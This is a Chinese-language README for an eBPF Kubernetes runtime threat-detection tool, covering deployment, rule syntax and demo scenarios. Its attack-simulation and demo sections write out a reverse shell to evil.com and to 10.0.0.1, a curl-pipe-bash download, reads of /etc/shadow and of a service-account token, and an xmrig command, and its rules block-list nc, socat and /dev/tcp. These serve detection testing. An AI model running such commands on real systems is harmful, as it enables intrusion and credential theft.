<div align="center">

# KubeVigil · K8s 守夜人

**基于 eBPF 的 Kubernetes 运行时威胁检测与响应工具**

[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)
[![Go Version](https://img.shields.io/badge/Go-1.21+-00ADD8?logo=go&logoColor=white)](https://golang.org)
[![eBPF](https://img.shields.io/badge/eBPF-CO--RE-orange.svg)](https://ebpf.io)
[![Kubernetes](https://img.shields.io/badge/Kubernetes-1.24+-326CE5?logo=kubernetes&logoColor=white)](https://kubernetes.io)
[![Version](https://img.shields.io/badge/version-0.1.0-green.svg)](https://github.com/shuhuNB515/KubeVigil)

</div>

---

## 项目简介

> **传统安全扫描是静态的，但真实攻击是动态的。**

KubeVigil（K8s 守夜人）是一个基于 **eBPF** 的 Kubernetes **运行时威胁检测与自动响应**工具。它直接在 Linux 内核态挂载系统调用 tracepoint，以零侵入方式实时捕获容器内的异常行为，并通过可定制的 YAML 规则引擎进行匹配，一旦检测到威胁即可自动执行隔离、终止、网络阻断等响应策略。

### 核心价值

- **内核态视角，无死角** — eBPF 探针运行在 Linux 内核态，监控 `execve`、`openat`、`connect` 三大关键系统调用，任何用户态程序都无法绕过
- **零侵入，无代理依赖** — 无需修改应用代码、注入 Sidecar 或安装额外 Agent 到业务容器中，KubeVigil 以 DaemonSet 方式独立运行
- **BPF CO-RE，一次编译到处运行** — 采用 Compile Once - Run Everywhere 技术，无需为每个内核版本单独编译 eBPF 程序
- **实时检测 + 自动响应** — 从事件采集到规则匹配到执行响应，全链路毫秒级延迟，威胁一出现即被阻断
- **K8s 原生上下文** — 自动将内核态 PID 映射到 K8s Pod/Namespace，告警自带完整的容器上下文信息
- **YAML 规则，灵活可扩展** — 声明式规则引擎，支持进程黑/白名单、敏感路径监控、CIDR 网段和端口过滤，支持热重载

### 为什么需要 KubeVigil？

| 传统静态扫描 | KubeVigil 运行时防护 |
|---|---|
| 检查镜像中已知漏洞（CVE） | 捕获运行时的未知攻击（0day） |
| 检查 YAML 配置是否规范 | 监控实际系统调用行为 |
| 无法发现 0day 漏洞利用 | 内核态视角，攻击者无法绕过 |
| 无法发现无文件攻击、内存马 | 捕获反弹 Shell、脚本注入 |
| 事后审计，攻击已造成损失 | 实时检测 + 自动响应，秒级阻断 |
| 需要修改应用代码或注入 Sidecar | 零侵入，以 DaemonSet 独立运行 |
| 规则硬编码，更新需重新部署 | YAML 规则热重载，SIGHUP 即生效 |

### 典型检测场景

| 攻击场景 | 检测方式 | 自动响应 |
|---|---|---|
| 攻击者通过漏洞利用建立反弹 Shell | execve 监控 `nc`/`socat` + `/dev/tcp/` 参数 | Kill Pod |
| 容器内运行 `xmrig` 等挖矿程序 | execve 进程黑名单匹配 | Kill Pod |
| `curl \| bash` 远程下载执行恶意脚本 | execve 监控管道命令参数 | Label 隔离 |
| 非授权读取 `/etc/shadow`、K8s Secret | openat 敏感路径监控 | Label 隔离 |
| 与已知 C2 服务器建立连接 | connect CIDR + 端口黑名单 | NetworkPolicy 阻断 |

---

## 核心架构

```
┌─────────────────────────────────────────────────────────────────┐
│                     Kubernetes Cluster                          │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │                    KubeVigil DaemonSet                    │  │
│  │                                                           │  │
│  │  ┌─────────────────┐    ┌──────────────────────────────┐  │  │
│  │  │   eBPF Probes   │    │     User-space Agent         │  │  │
│  │  │   (Kernel)      │    │     (Go)                     │  │  │
│  │  │                 │    │                              │  │  │
│  │  │  ┌───────────┐  │    │  ┌────────────┐              │  │  │
│  │  │  │  execve   │──┼──Ring──│  Event     │              │  │  │
│  │  │  ├───────────┤  │ Buffer┼─>│  Receiver  │              │  │  │
│  │  │  │  openat   │──┼──┬────┼─>│            │              │  │  │
│  │  │  ├───────────┤  │  │    │  └─────┬──────┘              │  │  │
│  │  │  │  connect  │──┼──┘    │        │                     │  │  │
│  │  │  └───────────┘  │        │        ▼                     │  │  │
│  │  │                 │        │  ┌────────────┐              │  │  │
│  │  │  CO-RE (C)      │        │  │ Rule Engine│              │  │  │
│  │  └─────────────────┘        │  │ (YAML)     │              │  │  │
│  │                             │  └─────┬──────┘              │  │  │
│  │                             │        │                     │  │  │
│  │                             │        ▼                     │  │  │
│  │                             │  ┌────────────┐              │  │  │
│  │                             │  │ K8s Context│              │  │  │
│  │                             │  │ PID → Pod  │              │  │  │
│  │                             │  └─────┬──────┘              │  │  │
│  │                             │        │                     │  │  │
│  │                             │        ▼                     │  │  │
│  │                             │  ┌────────────────────────┐  │  │  │
│  │                             │  │  Response & Remediation│  │  │  │
│  │                             │  │                        │  │  │  │
│  │                             │  │  • Label (Isolate)     │  │  │  │
│  │                             │  │  • Kill Pod            │  │  │  │
│  │                             │  │  • NetworkPolicy       │  │  │  │
│  │                             │  └────────────────────────┘  │  │  │
│  │                             └──────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

### 三层架构

| 层 | 组件 | 职责 |
|---|---|---|
| **内核态探针层** | `bpf/probes/probes.bpf.c` | 挂载系统调用 tracepoint，通过 Ring Buffer 发送事件 |
| **用户态分析引擎** | `internal/agent/` + `internal/rules/` | 接收事件、规则匹配、PID→Pod 上下文映射 |
| **响应与加固层** | `internal/k8s/resolver.go` | 调用 K8s API 执行隔离/终止/网络阻断 |

---

## 功能特性

### 监控能力

- **进程执行监控 (execve)** — 捕获容器内所有新启动的进程，含父进程追踪（PPID）
- **文件访问监控 (open)** — 监控对敏感文件的非授权读取
- **网络连接监控 (connect)** — 捕获恶意的外连请求（自动处理网络字节序）

### 运维能力

- **规则热重载** — 发送 `SIGHUP` 信号即可重载规则，无需重启 Agent
- **日志级别控制** — 支持 debug/info/warn/error 四级日志过滤
- **优雅关闭** — 收到 SIGINT/SIGTERM 后优雅关闭 Ring Buffer 和探针
- **线程安全** — 规则引擎读写锁保护，热重载不影响事件处理
- **健康检查** — DaemonSet 配置 livenessProbe，K8s 自动重启异常 Agent

### 内置安全规则

| 规则 | 类型 | 严重等级 | 响应动作 | 描述 |
|---|---|---|---|---|
| `reverse-shell-detected` | execve | 🔴 Critical | Kill Pod | 检测 `nc`、`socat` 等网络工具 + `/dev/tcp/` 可疑参数 |
| `suspicious-download` | execve | 🟠 High | Label | 检测 `curl \| bash` 等可疑下载行为 |
| `crypto-mining` | execve | 🔴 Critical | Kill Pod | 检测 `xmrig`、`minerd` 等挖矿程序 |
| `sensitive-file-access` | open | 🟠 High | Label | 检测对 `/etc/shadow`、K8s Secret 的访问 |
| `c2-communication` | connect | 🔴 Critical | NetworkPolicy | 检测与已知 C2 服务器的通信 |

### 自动响应动作

| 动作 | 说明 |
|---|---|
| `alert` | 仅告警，不执行动作 |
| `label` | 给 Pod 打上隔离标签，触发 NetworkPolicy 阻断 |
| `kill` | 立即终止受感染的 Pod |
| `network_policy` | 标记 Pod 并触发 NetworkPolicy 网络隔离 |

---

## 快速开始

### 前置要求

- Kubernetes >= 1.24
- Linux Kernel >= 5.8（支持 BPF CO-RE）
- 节点已启用 BTF（`/sys/kernel/btf/vmlinux` 存在）
- Helm 3.x

### 一键部署

```bash
# 克隆仓库
git clone https://github.com/shuhuNB515/KubeVigil.git
cd KubeVigil

# Helm 一键安装
helm install kubevigil ./charts/kubevigil \
  --namespace kubevigil \
  --create-namespace
```

### 验证部署

```bash
# 查看 DaemonSet
kubectl get daemonset -n kubevigil

# 查看 Agent 日志
kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil -f
```

### 卸载

```bash
helm uninstall kubevigil --namespace kubevigil
```

### 规则热重载

运行中的 Agent 支持通过 SIGHUP 信号热重载规则，无需重启：

```bash
# 查找 Agent PID
kubectl exec -n kubevigil <pod-name> -- kill -HUP 1

# 或者直接修改 ConfigMap，Agent 会自动检测变化
kubectl edit configmap -n kubevigil kubevigil
```

---

## 使用指南

### 第一步：部署 KubeVigil

#### 方式一：Helm 一键部署（推荐）

```bash
# 克隆仓库
git clone https://github.com/shuhuNB515/KubeVigil.git
cd KubeVigil

# Helm 安装
helm install kubevigil ./charts/kubevigil \
  --namespace kubevigil \
  --create-namespace

# 验证部署
kubectl get pods -n kubevigil
# 期望输出：每个节点一个 kubevigil Pod，状态 Running
```

#### 方式二：自定义配置部署

```bash
# 先查看默认配置
helm show values ./charts/kubevigil > my-values.yaml

# 编辑 my-values.yaml，按需修改
vim my-values.yaml

# 使用自定义配置安装
helm install kubevigil ./charts/kubevigil \
  --namespace kubevigil \
  --create-namespace \
  -f my-values.yaml
```

#### 方式三：从源码构建部署

```bash
# 1. 编译 eBPF 探针（需要 clang/llvm/libbpf-dev）
make bpf

# 2. 编译 Go 二进制
make build

# 3. 构建 Docker 镜像
make docker

# 4. 推送到你的镜像仓库
docker tag kubevigil:latest your-registry/kubevigil:latest
docker push your-registry/kubevigil:latest

# 5. 使用自定义镜像部署
helm install kubevigil ./charts/kubevigil \
  --namespace kubevigil --create-namespace \
  --set image.repository=your-registry/kubevigil \
  --set image.tag=latest
```

### 第二步：验证运行状态

```bash
# 查看 DaemonSet 状态
kubectl get daemonset -n kubevigil

# 查看 Agent 日志（实时跟踪）
kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil -f

# 检查 eBPF 探针是否加载成功
kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep "eBPF"
# 期望输出：[Agent] eBPF 探针已加载

# 检查规则是否加载成功
kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep "规则"
# 期望输出：[Agent] 已加载 5 条规则
```

### 第三步：模拟攻击测试

部署测试 Pod 并模拟攻击行为：

```bash
# 1. 部署测试 Pod
kubectl apply -f examples/test-pod.yaml

# 2. 进入测试 Pod
kubectl exec -it kubevigil-test -- sh

# 3. 在测试 Pod 内模拟攻击
## 反弹 Shell（应触发 reverse-shell-detected）
nc -e /bin/bash 10.0.0.1 4444

## 敏感文件访问（应触发 sensitive-file-access）
cat /etc/shadow

## 可疑下载（应触发 suspicious-download）
curl http://evil.com/shell.sh | bash

# 4. 退出测试 Pod，查看 KubeVigil 告警日志
kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep ALERT
```

或使用自动化攻击模拟脚本：

```bash
# 将脚本复制到测试 Pod 中执行
kubectl cp examples/attack-simulation.sh kubevigil-test:/tmp/attack.sh
kubectl exec kubevigil-test -- chmod +x /tmp/attack.sh
kubectl exec kubevigil-test -- /tmp/attack.sh
```

### 第四步：自定义安全规则

#### 方式一：修改 ConfigMap（热重载）

```bash
# 编辑运行中的规则配置
kubectl edit configmap -n kubevigil kubevigil

# 修改后发送 SIGHUP 信号热重载
AGENT_POD=$(kubectl get pods -n kubevigil -l app.kubernetes.io/name=kubevigil -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n kubevigil $AGENT_POD -- kill -HUP 1

# 验证规则已重载
kubectl logs -n kubevigil $AGENT_POD | tail -5
```

#### 方式二：通过 Helm Values 自定义

```bash
# 创建自定义规则文件
cat > my-rules.yaml << 'EOF'
rules:
  - name: no-python-in-nginx
    description: "禁止在 nginx 容器中执行 python"
    severity: high
    action: kill_pod
    execve:
      blockedProcesses:
        - python
        - python3
        - pip

  - name: block-malicious-ip
    description: "阻断到已知恶意 IP 的连接"
    severity: critical
    action: network_policy
    connect:
      blockedCIDRs:
        - "203.0.113.0/24"
      blockedPorts:
        - 4444
        - 1337
EOF

# 使用自定义规则部署
helm upgrade kubevigil ./charts/kubevigil \
  --namespace kubevigil \
  --set-file rules.content=./my-rules.yaml
```

#### 规则语法详解

```yaml
rules:
  - name: <规则名称>              # 必填，唯一标识
    description: "<规则描述>"      # 可选，说明规则用途
    severity: <critical|high|medium|low>  # 必填，严重等级
    action: <alert|label|kill_pod|network_policy>  # 必填，响应动作
    execve:                       # 进程执行规则
      blockedProcesses:           # 进程名黑名单（匹配 basename）
        - nc
        - xmrig
      blockedArgs:               # 参数黑名单（子串匹配）
        - "/dev/tcp/"
        - "| bash"
      excludeProcesses:           # 排除的进程（白名单）
        - kubevigil
    open:                         # 文件访问规则
      sensitivePaths:             # 敏感路径列表
        - /etc/shadow
        - /root/.ssh
      excludeProcesses:           # 排除的进程
        - kubevigil
    connect:                      # 网络连接规则
      blockedPorts:               # 端口黑名单
        - 4444
        - 1337
      blockedCIDRs:              # IP/CIDR 黑名单
        - "203.0.113.0/24"
      excludeProcesses:           # 排除的进程
        - kubevigil
```

### 第五步：配置告警响应

#### 响应动作说明

| 动作 | 效果 | 适用场景 |
|---|---|---|
| `alert` | 仅输出告警日志，不执行任何操作 | 观察模式、调试 |
| `label` | 给 Pod 打上 `kubevigil.io/isolated=true` 标签 | 中等风险，配合 NetworkPolicy 隔离 |
| `kill_pod` | 立即删除 Pod（gracePeriod=0） | 高危威胁，如挖矿、反弹 Shell |
| `network_policy` | 打标签 + 触发 NetworkPolicy 阻断流量 | C2 通信、数据外泄 |

#### 配合 NetworkPolicy 实现网络隔离

`label` 和 `network_policy` 动作需要配合 NetworkPolicy 才能生效：

```yaml
# 部署此 NetworkPolicy，被 KubeVigil 打上隔离标签的 Pod 将被阻断所有流量
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: kubevigil-isolation
  namespace: default
spec:
  podSelector:
    matchLabels:
      kubevigil.io/isolated: "true"
  policyTypes:
    - Ingress
    - Egress
  # 不定义 ingress/egress rules = 拒绝所有流量
```

```bash
# 应用 NetworkPolicy
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: kubevigil-isolation
  namespace: default
spec:
  podSelector:
    matchLabels:
      kubevigil.io/isolated: "true"
  policyTypes:
    - Ingress
    - Egress
EOF
```

### 第六步：日常运维

#### 查看告警历史

```bash
# 查看所有告警
kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep ALERT

# 按严重等级过滤
kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep "Severity: critical"

# 按规则名过滤
kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep "reverse-shell"

# 按命名空间过滤
kubectl logs -n kubevigil -l app.kubernetes.io/name=kubevigil | grep "Namespace: production"
```

#### 调整日志级别

```bash
# 临时修改（Pod 重启后失效）
kubectl edit configmap -n kubevigil kubevigil
# 将 logLevel 改为 debug/warn/error

# 永久修改（通过 Helm Values）
helm upgrade kubevigil ./charts/kubevigil \
  --namespace kubevigil \
  --set config.logLevel=debug
```

#### 规则热重载

```bash
# 方式一：发送 SIGHUP 信号
AGENT_POD=$(kubectl get pods -n kubevigil -l app.kubernetes.io/name=kubevigil -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n kubevigil $AGENT_POD -- kill -HUP 1

# 方式二：修改 ConfigMap 后重启 Agent
kubectl rollout restart daemonset -n kubevigil kubevigil
```

#### 升级 KubeVigil

```bash
# 拉取最新代码
git pull origin main

# Helm 升级
helm upgrade kubevigil ./charts/kubevigil --namespace kubevigil
```

#### 卸载

```bash
# 卸载 KubeVigil
helm uninstall kubevigil --namespace kubevigil

# 清理命名空间
kubectl delete namespace kubevigil

# 清理隔离标签（如有）
kubectl label pod <pod-name> kubevigil.io/isolated- --overwrite
```

### 常见问题排查

| 问题 | 排查方法 |
|---|---|
| Pod 启动失败，报 BTF 错误 | 检查节点是否支持 BTF：`ls /sys/kernel/btf/vmlinux` |
| Agent 日志无事件输出 | 确认 eBPF 探针加载成功，检查 `logLevel` 是否为 `error` |
| 规则未生效 | 检查 ConfigMap 中的规则格式，确认 YAML 语法正确 |
| PID 无法映射到 Pod | 检查 cgroup 路径是否匹配，查看 Agent 日志中的 cgroup 调试信息 |
| 响应动作未执行 | 确认 `response.enabled=true`，检查 Agent 的 RBAC 权限 |
| 误报过多 | 调整规则的 `excludeProcesses` 白名单，降低 `severity` 等级 |

---

## 本地构建

### 从源码构建

```bash
# 安装依赖
sudo apt-get install -y clang llvm libbpf-dev linux-headers-generic

# 编译 eBPF 探针
make bpf

# 编译 Go 二进制
make build

# 或一步完成
make all
```

### 构建 Docker 镜像

```bash
make docker
```

### 运行测试

```bash
make test
```

### Makefile 命令一览

```bash
make help
```

```
  make bpf           - 编译 eBPF 探针
  make build         - 编译 Go 二进制
  make build-local   - 本地编译（不交叉编译）
  make docker        - 构建 Docker 镜像
  make docker-push   - 推送 Docker 镜像
  make helm          - 打包 Helm Chart
  make install       - 安装到 K8s 集群
  make uninstall     - 从集群卸载
  make test          - 运行测试
  make lint          - 代码检查
  make tidy          - 整理 Go 模块
  make clean         - 清理构建产物
```

---

## 项目结构

```
KubeVigil/
├── bpf/
│   └── probes/
│       └── probes.bpf.c          # eBPF 内核态探针 (C, CO-RE)
├── cmd/
│   └── kubevigil/
│       └── main.go               # CLI 入口
├── internal/
│   ├── agent/
│   │   └── agent.go              # 用户态 Agent 核心
│   ├── config/
│   │   └── config.go             # 配置管理
│   ├── event/
│   │   └── event.go              # 事件模型与告警
│   ├── k8s/
│   │   └── resolver.go           # PID→Pod 映射 + 响应执行
│   └── rules/
│       ├── engine.go             # YAML 规则引擎
│       └── engine_test.go        # 规则引擎单元测试
├── configs/
│   ├── config.yaml               # 全局配置示例
│   └── rules.yaml                # 默认安全规则
├── examples/
│   ├── attack-simulation.sh      # 攻击模拟脚本
│   ├── custom-rules.yaml         # 自定义规则示例
│   └── test-pod.yaml             # 测试 Pod
├── charts/
│   └── kubevigil/                # Helm Chart
│       ├── Chart.yaml
│       ├── values.yaml
│       └── templates/
│           ├── _helpers.tpl
│           ├── serviceaccount.yaml
│           ├── clusterrole.yaml
│           ├── configmap.yaml
│           └── daemonset.yaml
├── Dockerfile                    # 多阶段构建
├── Makefile                      # 构建自动化
├── go.mod
├── CONTRIBUTING.md               # 贡献指南
└── LICENSE
```

---

## 技术栈

| 组件 | 技术 | 说明 |
|---|---|---|
| eBPF 探针 | C + BPF CO-RE | 编译一次，到处运行 |
| 用户态 Agent | Go 1.21 | 云原生标准语言 |
| eBPF 库 | cilium/ebpf | 纯 Go eBPF 加载器 |
| K8s 客户端 | client-go | 官方 K8s Go 客户端 |
| CLI 框架 | cobra | 云原生标准 CLI |
| 配置格式 | YAML | 人类可读的规则定义 |
| 部署方式 | DaemonSet + Helm | 每节点一个 Agent |

---

## 工作原理

### 1. 内核态：eBPF 探针

KubeVigil 使用 BPF CO-RE 技术编写 eBPF 程序，挂载到三个关键系统调用的 tracepoint：

```
tracepoint/syscalls/sys_enter_execve   →  捕获进程执行
tracepoint/syscalls/sys_enter_openat   →  捕获文件访问
tracepoint/syscalls/sys_enter_connect  →  捕获网络连接
```

探针通过 **Ring Buffer** 将事件高效地传递到用户态，每个事件包含 PID、进程名、参数、cgroup ID 等上下文信息。

### 2. 用户态：规则引擎

Agent 从 Ring Buffer 读取原始事件后：

1. **解析事件** — 将二进制数据反序列化为结构化事件
2. **规则匹配** — 根据 YAML 规则进行黑白名单匹配
3. **上下文丰富** — 通过 cgroup ID 将 PID 映射到 K8s Pod/Namespace
4. **生成告警** — 匹配成功则生成告警并触发响应

### 3. 响应层：K8s API 交互

当规则匹配且需要响应时，Agent 调用 K8s API：

- **`label`** — 给 Pod 打上 `kubevigil.io/isolated=true` 标签，配合 NetworkPolicy 实现网络隔离
- **`kill`** — 直接删除受感染的 Pod（GracePeriod=0）
- **`network_policy`** — 打标签触发 NetworkPolicy 阻断所有入出流量

---

## 演示场景

### 场景 1：检测反弹 Shell

攻击者在 Web 漏洞利用后尝试建立反弹 Shell：

```bash
# 攻击者在容器内执行
bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'
```

KubeVigil 输出：

```
[ALERT] [EXECVE] 2024-01-15 10:23:45 | Namespace: default, Pod: nginx-xyz | 异常执行了黑名单进程: nc | Rule: reverse-shell-detected | Severity: critical | Action: kill
[K8s] 已终止 Pod: default/nginx-xyz
```

### 场景 2：检测挖矿程序

```bash
# 攻击者在容器内运行挖矿程序
xmrig -o pool.mine.xyz:3333 -u wallet
```

KubeVigil 输出：

```
[ALERT] [EXECVE] 2024-01-15 10:24:12 | Namespace: production, Pod: api-server-abc | 异常执行了黑名单进程: xmrig | Rule: crypto-mining | Severity: critical | Action: kill
[K8s] 已终止 Pod: production/api-server-abc
```

### 场景 3：检测敏感文件访问

```bash
# 攻击者尝试读取 K8s Service Account Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

KubeVigil 输出：

```
[ALERT] [OPEN] 2024-01-15 10:25:30 | Namespace: default, Pod: compromised-pod | 进程 cat 访问了敏感路径: /var/run/secrets/kubernetes.io/serviceaccount/token | Rule: sensitive-file-access | Severity: high | Action: label
[K8s] 已隔离 Pod: default/compromised-pod (标签: kubevigil.io/isolated=true)
```

---

## 路线图

- [x] **阶段一：MVP** — eBPF 探针 + execve 监控 + 实时告警
- [x] **阶段二：规则化** — YAML 规则引擎 + 黑白名单
- [x] **阶段三：自动响应** — K8s API 集成 + 隔离/终止
- [x] **阶段四：部署** — Dockerfile + Helm Chart
- [x] **阶段四+：加固** — 内存对齐修复 + PID 映射 + 规则热重载 + 优雅关闭 + 线程安全 + 健康检查
- [ ] **阶段五：Web Dashboard** — 轻量级 Web 界面展示告警与统计
- [ ] **阶段六：威胁情报集成** — 接入外部威胁情报源
- [ ] **阶段七：eBPF Map 状态追踪** — 进程血缘关系追踪
- [ ] **阶段八：Prometheus 指标** — 安全指标导出与告警

---

## 贡献

欢迎提交 Issue 和 Pull Request！

1. Fork 本仓库
2. 创建特性分支 (`git checkout -b feature/amazing-feature`)
3. 提交更改 (`git commit -m 'Add amazing feature'`)
4. 推送分支 (`git push origin feature/amazing-feature`)
5. 创建 Pull Request

---

## 许可证

[Apache License 2.0](LICENSE)

---

## 致谢

- [cilium/ebpf](https://github.com/cilium/ebpf) — 纯 Go eBPF 库
- [aquasecurity/tracee](https://github.com/aquasecurity/tracee) — eBPF 安全灵感来源
- [Falco](https://github.com/falcosecurity/falco) — 云原生运行时安全先驱

---

<div align="center">

**KubeVigil — 让你的 Kubernetes 集群在夜晚也能安然无恙。**

</div>
